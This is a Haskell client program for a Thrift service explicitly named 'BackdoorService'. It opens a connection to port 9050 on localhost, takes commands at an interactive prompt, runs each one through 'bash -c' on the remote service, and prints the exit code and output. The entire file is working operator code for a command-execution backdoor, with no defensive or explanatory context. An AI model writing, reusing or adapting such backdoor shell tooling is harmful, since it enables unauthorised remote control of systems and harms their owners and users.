{-# LANGUAGE BangPatterns, OverloadedStrings #-}

module Main where

import qualified Data.Text.Lazy as Text
import qualified Data.Vector as Vec

import Network

import System.IO (hFlush, stdout)

import Thrift
import Thrift.Types ()
import Thrift.Transport.Handle
import Thrift.Protocol.Binary

import BackdoorService_Types
import qualified BackdoorService_Client as Cl

main = do
    !h <- connectTo "localhost" $ PortNumber 9050
    let !proto = BinaryProtocol h

    putStr "> "
    hFlush stdout
    !cmdi <- fmap words $ getLine :: IO [String]

    if cmdi == ["q"]
        then return ()
        else do
            let !cmd = ["bash", "-c"] ++ cmdi

            resp <- Cl.exec (proto, proto) (Text.pack $ head cmd) (Vec.fromList $ map Text.pack $ tail cmd) (Text.pack "")
            let ExecResponse ec so _ = resp
            if ec /= 0
                then putStrLn $ "! " ++ show ec
                else return ()

            case so of
                Just t  -> putStr $ Text.unpack t
                Nothing -> return ()

            main
